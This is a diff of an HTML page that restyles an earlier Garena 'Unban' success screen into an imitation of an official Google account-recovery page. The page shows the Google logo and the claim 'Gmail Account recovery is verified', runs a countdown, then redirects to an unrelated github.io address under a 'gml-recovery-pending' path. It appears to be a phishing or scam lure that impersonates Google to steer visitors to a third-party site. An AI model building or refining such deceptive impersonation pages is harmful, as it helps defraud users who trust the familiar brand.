@@ -2,157 +2,133 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unban</title>
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Account Recovery Success</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    
     <style>
-        /* Basic Page Setup */
+        /* =========================================
+           GOOGLE OFFICIAL LIGHT THEME STYLES
+           ========================================= */
         body, html {
             margin: 0;
             padding: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at center, #222222 0%, #000000 100%);
-            font-family: 'Teko', sans-serif;
-            overflow: hidden;
-            color: white;
+            background-color: #f0f4f9; /* Google Background Color */
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
+            color: #202124;
+            overflow: hidden;
         }
 
-        /* --- GARENA LOGO --- */
-        #top-logo {
-            position: absolute;
-            top: 30px;
-            width: 130px; 
-            z-index: 10;
-            filter: drop-shadow(0 0 8px rgba(255, 0, 0, 1)) 
-                    drop-shadow(0 0 20px rgba(200, 0, 0, 0.6));
-        }
-
-        /* --- MAIN CONTAINER (Super Slow Motion Zoom Entry) --- */
+        /* --- MAIN CARD --- */
         #main-container {
+            background-color: #ffffff;
+            padding: 40px 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            width: 100%;
+            max-width: 420px;
+            box-sizing: border-box;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh; 
-            width: 100%;
-            padding: 0 10px;
-            box-sizing: border-box;
-
-            /* Start State */
-            opacity: 0;
-            transform: scale(4); 
-            filter: blur(20px); 
             
-            /* UPDATED: Increased duration to 3.5s for Slow Motion */
-            animation: smoothEntry 3.5s cubic-bezier(0.19, 1, 0.22, 1) forwards;
+            /* Smooth Google-style fade in */
+            animation: fadeInCard 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
         }
 
-        /* Animation Logic */
-        @keyframes smoothEntry {
-            0% { 
-                opacity: 0; 
-                transform: scale(4); 
-                filter: blur(20px); 
-            }
-            100% { 
-                opacity: 1; 
-                transform: scale(1); 
-                filter: blur(0px); 
-            }
+        @keyframes fadeInCard {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* --- GREEN TICK MARK --- */
-        .success-icon {
-            width: 100px;
-            height: 100px;
-            margin: 0 auto;
-            /* Smooth Pulse Animation */
-            animation: pulseIcon 2s infinite ease-in-out;
+        /* --- GOOGLE LOGO --- */
+        .logo-container {
+            margin-bottom: 20px;
         }
 
-        .success-icon svg {
-            width: 100%;
-            height: 100%;
-            fill: #39FF14;
-            filter: drop-shadow(0 0 10px rgba(57, 255, 20, 0.8));
+        .logo-container img {
+            height: 32px; 
         }
 
-        @keyframes pulseIcon {
-            0% { transform: scale(1); filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.5)); }
-            50% { transform: scale(1.1); filter: drop-shadow(0 0 15px rgba(57, 255, 20, 1)); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 5px rgba(57, 255, 20, 0.5)); }
+        /* --- SUCCESS TICK ICON --- */
+        .success-circle {
+            width: 64px;
+            height: 64px;
+            background-color: #e6f4ea; /* Light Green Background */
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.2s both;
         }
 
-        /* --- CONGRATULATIONS TEXT --- */
-        #congrats-text {
-            font-size: 55px; 
-            font-weight: 700;
-            margin: 10px 0 0 0;
-            line-height: 1.1;
-            background: linear-gradient(to bottom, #FFF700, #FF8C00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 
-                0 0 15px rgba(255, 215, 0, 0.8),
-                0 0 30px rgba(255, 140, 0, 0.6);
-            max-width: 90%; 
+        .success-circle svg {
+            width: 32px;
+            height: 32px;
+            fill: #0f9d58; /* Google Official Green */
         }
 
-        /* --- INFO TEXT --- */
-        #info-text {
-            font-size: 28px;
-            color: #e0e0e0;
-            margin-top: 20px;
-            letter-spacing: 1.5px;
-            line-height: 1.4; 
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
         }
-        
-        .highlight {
-            color: #ffffff;
-            font-weight: bold;
+
+        /* --- TEXT STYLES --- */
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin: 0 0 10px 0;
         }
-        
-        .status {
-            color: #aaaaaa;
-            font-size: 0.8em;
-            display: block;
+
+        p.info-text {
+            font-size: 16px;
+            color: #5f6368;
+            margin: 0 0 25px 0;
+            line-height: 1.5;
+        }
+
+        /* --- STATIC TIMER STYLES (No Blinking, Clear Drop Shadow) --- */
+        .timer-wrapper {
             margin-top: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* Timer Container */
-        #timer-container {
-            margin-top: 30px;
-        }
-
-        /* Glowing Green Number */
         #timer {
-            font-size: 60px;
-            font-weight: 700;
-            color: #39FF14;
-            text-shadow: 
-                0 0 10px #39FF14,
-                0 0 20px #39FF14,
-                0 0 40px #008000;
-            display: block;
+            font-size: 45px; 
+            font-weight: 900;
+            color: #0f9d58; /* Solid, strong Google Green */
+            
+            /* Clean black drop shadow for depth + slight green shadow for premium feel */
+            text-shadow: 2px 4px 6px rgba(0, 0, 0, 0.2), 0 0 12px rgba(15, 157, 88, 0.35);
+            
+            min-width: 50px;
             line-height: 1;
+            /* Blinking animation hata di gayi hai */
         }
 
-        /* Loading Overlay */
+        /* --- LOADING OVERLAY --- */
         #loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #000000;
+            /* 60% white background so the card behind is still visible */
+            background: rgba(255, 255, 255, 0.6); 
+            /* Blur effect for the background (dhundhla karne ke liye) */
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px);
             display: none;
             justify-content: center;
             align-items: center;
@@ -160,48 +136,53 @@
         }
 
         #loading-image {
-            width: 100px;
-            animation: rapidBlink 0.8s infinite alternate;
+            width: 80px; 
+            animation: pulseGif 1s infinite alternate;
         }
 
-        @keyframes rapidBlink {
-            0% { opacity: 0.3; transform: scale(0.95); }
+        @keyframes pulseGif {
+            0% { opacity: 0.6; transform: scale(0.95); }
             100% { opacity: 1; transform: scale(1.05); }
         }
 
         /* --- MOBILE RESPONSIVE --- */
-        @media (max-width: 768px) {
-            #main-container { padding-top: 70px; }
-            #congrats-text { font-size: 9vw; letter-spacing: 1px; }
-            #info-text { font-size: 22px; margin-top: 15px; }
-            #timer { font-size: 50px; }
-            #top-logo { width: 100px; top: 25px; }
-            .success-icon { width: 80px; height: 80px; }
+        @media (max-width: 480px) {
+            #main-container { 
+                padding: 30px 25px; 
+                margin: 15px;
+                border-radius: 12px;
+            }
+            h1 { font-size: 22px; }
+            p.info-text { font-size: 15px; }
+            #timer { font-size: 40px; }
         }
     </style>
 </head>
 <body>
 
-    <img id="top-logo" src="gml.gif" alt="Logo">
-
     <div id="main-container">
         
-        <div class="success-icon">
+        <div class="logo-container">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+
+        <div class="success-circle">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
             </svg>
         </div>
 
-        <h1 id="congrats-text">CONGRATULATIONS</h1>
+        <h1>Congratulations</h1>
         
-        <div id="info-text">
-            <span class="highlight">Gmail Account recovery</span>
-            <span class="status">Proceed...</span>
-        </div>
+        <p class="info-text">
+            Gmail Account recovery is verified.<br>
+            Preparing to proceed to the next step.
+        </p>
 
-        <div id="timer-container">
+        <div class="timer-wrapper">
             <span id="timer">10</span>
         </div>
+
     </div>
 
     <div id="loading-overlay">
@@ -211,9 +192,7 @@
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const timerSpan = document.getElementById('timer');
-            const mainContainer = document.getElementById('main-container');
             const loadingOverlay = document.getElementById('loading-overlay');
-            const topLogo = document.getElementById('top-logo');
             
             let timeLeft = 10;
 
@@ -229,12 +208,12 @@
             }, 1000);
 
             function startLoadingSequence() {
-                mainContainer.style.display = 'none';
-                topLogo.style.display = 'none';
+                // Show transparent blurred loading screen over the existing page
                 loadingOverlay.style.display = 'flex';
 
+                // Wait 3 seconds then redirect
                 setTimeout(() => {
-                    // Redirect Link
+                    // Your exact original redirect link
                     window.location.href = "https://gmlunlok.github.io/recovery/congratulations/gml-recovery-pending-id-456757687fgv";
                 }, 3000);
             }
